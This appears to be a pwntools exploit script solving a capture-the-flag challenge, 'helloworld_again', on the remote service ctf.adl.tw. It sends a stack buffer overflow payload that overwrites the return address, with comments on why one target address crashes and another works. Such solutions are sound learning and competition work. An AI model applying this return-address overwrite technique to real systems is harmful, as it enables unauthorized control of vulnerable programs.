from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
# elf = ELF('./helloworld_again')
# print('%x'%elf.sym['helloworld'])

r = remote('ctf.adl.tw', 10001)
# p = process('./helloworld_again')

payload = b'helloworld\0' + b'a' * (40 - 11) + p64(0x401263)
# * This one will cause the process to exit with -11 (SIGSEGV) if the return address is overflowed with the address of helloworld() (0x40125b)
# * The solution is to overflow the return address with 0x401263 instead of 0x40125b
# aaaaaaaabaaaaaaacaaaaaaadaaa 29 junk characters

# p.sendafter(b'!', payload)
r.sendafter(b'!', payload)

# p.interactive()
r.interactive()
